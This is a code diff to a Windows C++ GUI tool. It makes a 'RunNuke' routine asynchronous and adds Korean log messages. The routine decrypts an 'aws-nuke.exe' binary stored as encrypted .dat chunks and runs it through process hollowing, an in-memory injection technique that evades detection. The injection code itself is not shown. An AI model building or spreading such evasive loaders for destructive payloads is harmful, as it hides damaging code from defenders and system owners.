@@ -244,14 +244,28 @@ void SaveFiles(HWND hwnd) {
     MessageBox(hwnd, L"Settings saved.", L"Success", MB_OK | MB_ICONINFORMATION);
 }
 
-void RunNuke(HWND hwnd) {
+DWORD WINAPI RunNukeAsync(LPVOID lpParam) {
+    HWND hwnd = (HWND)lpParam;
+    AppendLog(L"> aws-nuke.exe .dat 조각들로부터 불러오는 중...\r\n");
+    
     auto payload = LoadAndDecryptBinary();
     if (payload.empty()) {
-        MessageBox(hwnd, L"Failed to load data chunks.", L"Error", MB_OK | MB_ICONERROR);
-        return;
+        AppendLog(L"[ERROR] data 조각들을 찾을 수 없거나 불러오기에 실패했습니다.\r\n");
+        // MessageBox(hwnd, L"Failed to load data chunks.", L"Error", MB_OK | MB_ICONERROR);
+        return 1;
     }
 
-    ProcessHollow(payload, L"");
+    AppendLog(L"> 바이너리 복호화 완료. 인메모리 프로세스 주입을 시도합니다...\r\n");
+    if (ProcessHollow(payload, L"")) {
+        AppendLog(L"> 프로세스 주입 성공. aws-nuke 인스턴스가 실행 중입니다.\r\n");
+    } else {
+        AppendLog(L"[ERROR] 프로세스 주입(Process Hollowing)에 실패했습니다.\r\n");
+    }
+    return 0;
+}
+
+void RunNuke(HWND hwnd) {
+    CreateThread(NULL, 0, RunNukeAsync, hwnd, 0, NULL);
 }
 
 void UpdateNukeButtonState() {
@@ -328,7 +342,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
         
         // --- LOGS Section ---
         int logsLblY = nukeY + nukeH + 15;
-        CreateWindow(L"STATIC", L"📜 LOGS", WS_VISIBLE | WS_CHILD, 20, logsLblY, 200, 25, hwnd, NULL, NULL, NULL);
+        CreateWindow(L"STATIC", L"🖥️ TERMINAL", WS_VISIBLE | WS_CHILD, 20, logsLblY, 200, 25, hwnd, NULL, NULL, NULL);
         
         int logsEditY = logsLblY + 25;
         g_hLogs = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL, 20, logsEditY, 740, 320, hwnd, (HMENU)ID_EDIT_LOGS, NULL, NULL);
